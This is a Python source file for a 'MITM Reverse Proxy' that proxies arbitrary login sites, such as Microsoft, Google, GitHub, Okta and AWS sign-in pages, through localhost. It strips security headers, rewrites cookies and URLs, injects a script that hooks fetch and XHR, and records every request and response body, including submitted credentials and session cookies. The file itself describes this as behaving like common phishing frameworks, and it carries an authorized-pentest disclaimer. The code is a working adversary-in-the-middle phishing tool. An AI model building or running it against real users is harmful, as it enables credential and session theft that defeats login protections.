"""Multi-tenant reverse proxy — transparent MITM of arbitrary login sites.

Authorized pentest / red-team use only.

How it works:
- Browse to http://localhost:8085/ and enter a target URL, or directly visit
  http://localhost:8085/_r/{target_hostname}/{path}
- Every request/response pair is proxied to the target, with URL rewriting,
  CSP/frame-header stripping, and cookie domain rewriting so the browser
  treats the proxied site as localhost.
- Every exchange is pushed into the existing flow tracer buffer under a
  synthetic session_id `revproxy_{target_hostname}` — shows up in the
  Flow Trace tab on :8092 with markers/taint/RAG/Ollama integration.

Known limitations (v1):
- No WebSocket upgrade forwarding (TODO).
- JS rewriting covers fetch() and XMLHttpRequest only. Dynamic imports,
  EventSource, service workers, and hard-coded absolute URLs in compiled JS
  bundles may leak or break.
- Sites with strict anti-framing checks (window.location === origin,
  subresource integrity across hosts) may detect the proxy.
"""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlparse

import httpx
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse

from backend.shared import append_flow, update_flow, append_log


app = FastAPI(title="MITM Reverse Proxy", version="1.0.0")


_STRIP_HEADERS = {
    "content-security-policy",
    "content-security-policy-report-only",
    "x-frame-options",
    "strict-transport-security",
    "permissions-policy",
    "feature-policy",
    "cross-origin-opener-policy",
    "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
    "content-length",    # will be recalculated
    "content-encoding",  # we request identity from upstream
    "transfer-encoding",
}

_HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade",
}


_LANDING_HTML = """<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>MITM Reverse Proxy</title>
<style>
body{font-family:system-ui,-apple-system,sans-serif;background:#0a0a1a;color:#e2e8f0;margin:0;padding:40px;max-width:720px}
h1{color:#7dd3fc;margin-bottom:8px}
.sub{color:#94a3b8;font-size:14px;margin-bottom:24px}
form{display:flex;gap:8px;margin-bottom:16px}
input{flex:1;padding:10px 12px;background:#1a1a2e;border:1px solid #444;color:#e2e8f0;border-radius:4px;font-size:14px}
input:focus{outline:none;border-color:#3b82f6}
button{padding:10px 20px;background:#1e3a5f;border:1px solid #3b82f6;color:#93c5fd;border-radius:4px;cursor:pointer;font-size:14px;font-weight:600}
button:hover{background:#264a72}
.section{margin-top:28px}
.section h2{color:#94a3b8;font-size:13px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.examples{display:flex;flex-wrap:wrap;gap:6px}
.examples span{background:#1a1a2e;border:1px solid #333;padding:4px 10px;border-radius:3px;color:#fbbf24;cursor:pointer;font-size:13px;font-family:'SF Mono',monospace}
.examples span:hover{border-color:#3b82f6}
.note{background:#1a1a14;border-left:3px solid #b45309;padding:10px 14px;margin-top:24px;font-size:13px;color:#fcd34d;line-height:1.6}
.active{margin-top:16px;background:#0d0d20;border:1px solid #222;border-radius:4px;padding:12px}
.active h2{margin-bottom:6px}
.active a{color:#7dd3fc;text-decoration:none;font-size:13px;display:block;padding:3px 0}
.active a:hover{text-decoration:underline}
</style></head>
<body>
<h1>MITM Reverse Proxy</h1>
<div class="sub">Multi-tenant transparent proxy. Every req/resp pair is captured to the Flow Trace tab on the debug dashboard (:8092) under session <code>revproxy_&lt;hostname&gt;</code>.</div>

<form onsubmit="event.preventDefault();go()">
  <input id="target" type="text" placeholder="https://login.microsoftonline.com" autofocus>
  <button type="submit">Proxy</button>
</form>

<div class="section">
  <h2>Quick targets</h2>
  <div class="examples">
    <span onclick="fill(this)">https://login.microsoftonline.com</span>
    <span onclick="fill(this)">https://accounts.google.com</span>
    <span onclick="fill(this)">https://github.com/login</span>
    <span onclick="fill(this)">https://okta.com</span>
    <span onclick="fill(this)">https://signin.aws.amazon.com</span>
  </div>
</div>

<div class="section" id="active-wrap" style="display:none">
  <h2>Sessions captured so far (this instance)</h2>
  <div class="active" id="active-list"></div>
</div>

<div class="note">
  Authorized pentest / red-team use only. This proxy behaves identically to
  common phishing frameworks — do not use against production systems without
  written authorization.
</div>

<script>
function fill(el){document.getElementById('target').value=el.textContent;go()}
function go(){
  const u=document.getElementById('target').value.trim();if(!u)return;
  let p;try{p=new URL(u.startsWith('http')?u:'https://'+u)}catch(e){alert('Invalid URL');return}
  window.location.href='/_r/'+p.hostname+(p.pathname||'/')+(p.search||'');
}
fetch('/_sessions').then(r=>r.json()).then(d=>{
  const list=d.sessions||[];
  if(!list.length)return;
  document.getElementById('active-wrap').style.display='';
  document.getElementById('active-list').innerHTML=list.map(h=>`<a href="/_r/${h}/">${h}</a>`).join('');
}).catch(()=>{});
</script>
</body>
</html>
"""


_JS_SHIM_TEMPLATE = """<base href="/_r/{host}/">
<script>(function(){{
  const P = "/_r/{host}";
  const origFetch = window.fetch;
  window.fetch = function(input, init){{
    try {{
      if (typeof input === 'string' && input.startsWith('/') && !input.startsWith(P)) {{
        input = P + input;
      }} else if (input && typeof input === 'object' && input.url && input.url.startsWith('/') && !input.url.startsWith(P)) {{
        input = new Request(P + input.url, input);
      }}
    }} catch(e){{}}
    return origFetch.call(this, input, init);
  }};
  const origXhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url){{
    try {{
      if (typeof url === 'string' && url.startsWith('/') && !url.startsWith(P)) {{
        arguments[1] = P + url;
      }}
    }} catch(e){{}}
    return origXhrOpen.apply(this, arguments);
  }};
}})();</script>
"""

# Absolute URL patterns to rewrite in response bodies
_ABS_URL_RE = re.compile(
    r'(https?:)?//([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})(/[^"\'\s<>)]*)?',
)


_session_hosts: set[str] = set()


@app.get("/")
async def landing():
    return HTMLResponse(_LANDING_HTML)


@app.get("/_sessions")
async def sessions_list():
    return {"sessions": sorted(_session_hosts)}


@app.get("/_pick")
async def pick(url: str = ""):
    if not url:
        return HTMLResponse(_LANDING_HTML)
    parsed = urlparse(url if "://" in url else "https://" + url)
    host = parsed.hostname
    if not host:
        return HTMLResponse(_LANDING_HTML)
    target = f"/_r/{host}{parsed.path or '/'}"
    if parsed.query:
        target += "?" + parsed.query
    return Response(status_code=302, headers={"Location": target})


def _rewrite_body(body: bytes, content_type: str, target_host: str) -> bytes:
    if not body:
        return body
    ct = content_type.lower()
    is_html = "html" in ct
    is_css = "css" in ct
    is_js = "javascript" in ct or "ecmascript" in ct
    is_json = "json" in ct
    is_text = "text/" in ct
    if not (is_html or is_css or is_js or is_json or is_text):
        return body
    try:
        text = body.decode("utf-8", errors="replace")
    except Exception:
        return body

    # Rewrite absolute URLs:  https://host.com/path  →  /_r/host.com/path
    def repl(m):
        scheme, host, path = m.group(1), m.group(2), m.group(3) or ""
        # Preserve surrounding context by only rewriting when this actually looks like a host
        return f"/_r/{host}{path}"

    text = _ABS_URL_RE.sub(repl, text)

    if is_html:
        shim = _JS_SHIM_TEMPLATE.format(host=target_host)
        if "<head>" in text:
            text = text.replace("<head>", "<head>" + shim, 1)
        elif "<html>" in text:
            text = text.replace("<html>", "<html>" + shim, 1)
        else:
            text = shim + text

    return text.encode("utf-8")


def _rewrite_location(location: str, target_host: str) -> str:
    if not location:
        return location
    if location.startswith(("http://", "https://")):
        parsed = urlparse(location)
        new = f"/_r/{parsed.netloc}{parsed.path}"
        if parsed.query:
            new += "?" + parsed.query
        return new
    if location.startswith("//"):
        parsed = urlparse("http:" + location)
        new = f"/_r/{parsed.netloc}{parsed.path}"
        if parsed.query:
            new += "?" + parsed.query
        return new
    if location.startswith("/"):
        return f"/_r/{target_host}{location}"
    return location


def _rewrite_set_cookie(cookie: str, target_host: str) -> str:
    parts = [p.strip() for p in cookie.split(";") if p.strip()]
    out: list[str] = []
    has_path = False
    for p in parts:
        low = p.lower()
        if low == "secure":
            continue
        if low.startswith("domain="):
            continue
        if low.startswith("samesite="):
            continue  # SameSite=None without Secure gets rejected; drop entirely
        if low.startswith("path="):
            raw_path = p.split("=", 1)[1].strip()
            if not raw_path.startswith("/"):
                raw_path = "/" + raw_path
            out.append(f"Path=/_r/{target_host}{raw_path}")
            has_path = True
            continue
        out.append(p)
    if not has_path:
        out.append(f"Path=/_r/{target_host}/")
    return "; ".join(out)


@app.api_route(
    "/_r/{target_host}/{path:path}",
    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
)
async def proxy(target_host: str, path: str, request: Request):
    return await _do_proxy(target_host, path, request)


@app.api_route(
    "/_r/{target_host}",
    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
)
async def proxy_root(target_host: str, request: Request):
    return await _do_proxy(target_host, "", request)


async def _do_proxy(target_host: str, path: str, request: Request) -> Response:
    sid = f"revproxy_{target_host}"
    _session_hosts.add(target_host)

    target_url = f"https://{target_host}/{path}"
    if request.url.query:
        target_url += "?" + request.url.query

    # Build upstream request headers
    req_headers: dict[str, str] = {}
    for k, v in request.headers.items():
        lk = k.lower()
        if lk in _HOP_BY_HOP or lk == "host" or lk == "content-length":
            continue
        # Rewrite Referer so upstream sees its own origin
        if lk == "referer" and "/_r/" in v:
            try:
                idx = v.find("/_r/") + 4
                tail = v[idx:]
                slash = tail.find("/")
                if slash > 0:
                    v = f"https://{tail[:slash]}{tail[slash:]}"
                else:
                    v = f"https://{tail}/"
            except Exception:
                pass
        # Drop our own Origin header (browser sets it to localhost:8085)
        if lk == "origin":
            v = f"https://{target_host}"
        req_headers[k] = v
    req_headers["Host"] = target_host
    req_headers["Accept-Encoding"] = "identity"  # so we can rewrite bodies

    req_body = await request.body()
    req_id = f"rp_{int(time.time()*1e6)}_{id(request)}"

    # Log so the session registers in the Flow Trace dropdown
    append_log("info", "reverse_proxy",
               f"PROXY {request.method} {target_url}",
               session_id=sid)

    append_flow(sid, {
        "req_id": req_id,
        "ts_req": time.time(),
        "ts_resp": None,
        "method": request.method,
        "url": target_url,
        "resource_type": "reverse_proxy",
        "redirected_from_seq": None,
        "request_headers": req_headers,
        "request_body": (req_body.decode("utf-8", errors="replace")
                         if req_body else None),
        "request_body_truncated": False,
        "status": None,
        "response_headers": None,
        "response_body": None,
        "response_body_truncated": False,
    })

    try:
        async with httpx.AsyncClient(follow_redirects=False, verify=False,
                                     timeout=30) as client:
            upstream = await client.request(
                request.method, target_url,
                headers=req_headers, content=req_body,
            )
    except Exception as e:
        append_log("warn", "reverse_proxy",
                   f"Upstream error: {e} for {target_url}",
                   session_id=sid)
        update_flow(sid, req_id, {"ts_resp": time.time(), "status": 502})
        return Response(f"Reverse proxy upstream error: {e}".encode(),
                        status_code=502,
                        headers={"content-type": "text/plain"})

    # Rewrite response headers
    out_headers: dict[str, str] = {}
    set_cookies: list[str] = []
    for k, v in upstream.headers.items():
        lk = k.lower()
        if lk in _STRIP_HEADERS or lk in _HOP_BY_HOP:
            continue
        if lk == "location":
            out_headers[k] = _rewrite_location(v, target_host)
            continue
        if lk == "set-cookie":
            set_cookies.append(_rewrite_set_cookie(v, target_host))
            continue
        out_headers[k] = v

    content_type = upstream.headers.get("content-type", "")
    body = _rewrite_body(upstream.content, content_type, target_host)

    # Record response in flow
    MAX_BODY = 64 * 1024
    body_text = body.decode("utf-8", errors="replace") if body else None
    body_truncated = bool(body and len(body) > MAX_BODY)
    update_flow(sid, req_id, {
        "ts_resp": time.time(),
        "status": upstream.status_code,
        "response_headers": dict(upstream.headers),
        "response_body": body_text[:MAX_BODY] if body_text else None,
        "response_body_truncated": body_truncated,
    })

    resp = Response(content=body, status_code=upstream.status_code,
                    headers=out_headers)
    for c in set_cookies:
        resp.headers.append("set-cookie", c)
    return resp
